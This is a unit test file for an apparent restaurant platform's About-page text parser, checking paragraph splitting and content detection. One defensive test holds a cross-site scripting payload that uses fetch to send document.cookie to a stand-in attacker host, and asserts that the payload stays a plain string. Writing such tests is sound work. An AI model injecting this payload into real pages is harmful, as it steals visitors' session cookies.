import { aboutParagraphs, hasAboutContent } from '@orderos/shared';

describe('About page content', () => {
  describe('aboutParagraphs', () => {
    it('splits on blank lines', () => {
      expect(aboutParagraphs('One.\n\nTwo.\n\nThree.')).toEqual(['One.', 'Two.', 'Three.']);
    });

    it('joins hard-wrapped lines within a paragraph', () => {
      // Someone pasting from Word gets lines wrapped at 72 characters. Rendering
      // those as written looks like the page is broken.
      expect(aboutParagraphs('We opened\nin 1998\nand never left.')).toEqual([
        'We opened in 1998 and never left.',
      ]);
    });

    it('tolerates Windows line endings', () => {
      expect(aboutParagraphs('One.\r\n\r\nTwo.')).toEqual(['One.', 'Two.']);
    });

    it('drops empty paragraphs from extra blank lines', () => {
      expect(aboutParagraphs('One.\n\n\n\n\nTwo.')).toEqual(['One.', 'Two.']);
    });

    it('returns nothing for empty input', () => {
      expect(aboutParagraphs('')).toEqual([]);
      expect(aboutParagraphs(null)).toEqual([]);
      expect(aboutParagraphs(undefined)).toEqual([]);
      expect(aboutParagraphs('   \n\n  ')).toEqual([]);
    });

    /**
     * The security property, stated as a test.
     *
     * This returns STRINGS, which the page renders as text nodes. It cannot return
     * markup, so there is no way to call it that injects anything — a tenant who
     * types a <script> tag gets a paragraph that visibly says "<script>".
     *
     * If someone later "improves" this into a markdown renderer that emits HTML,
     * this test is what should stop them.
     */
    it('never interprets HTML — a script tag stays a string', () => {
      const evil = '<script>fetch("//attacker/"+document.cookie)</script>';
      const [p] = aboutParagraphs(evil);

      expect(p).toBe(evil);
      expect(typeof p).toBe('string');
    });

    it('does not interpret markdown either', () => {
      expect(aboutParagraphs('**not bold** and [not a link](http://x)')).toEqual([
        '**not bold** and [not a link](http://x)',
      ]);
    });
  });

  describe('hasAboutContent', () => {
    it('is false for a restaurant that has written nothing', () => {
      expect(hasAboutContent({})).toBe(false);
      expect(hasAboutContent({ aboutBody: '   ', aboutHeadline: '' })).toBe(false);
    });

    it('is true if they wrote anything at all, or added a photo', () => {
      expect(hasAboutContent({ aboutBody: 'We grind the beef ourselves.' })).toBe(true);
      expect(hasAboutContent({ aboutHeadline: 'Our story' })).toBe(true);
      expect(hasAboutContent({ description: 'Smash burgers.' })).toBe(true);
      expect(
        hasAboutContent({
          galleryImages: [{ id: '1', url: 'https://x/1.jpg', caption: null, sortOrder: 0 }],
        }),
      ).toBe(true);
    });
  });
});
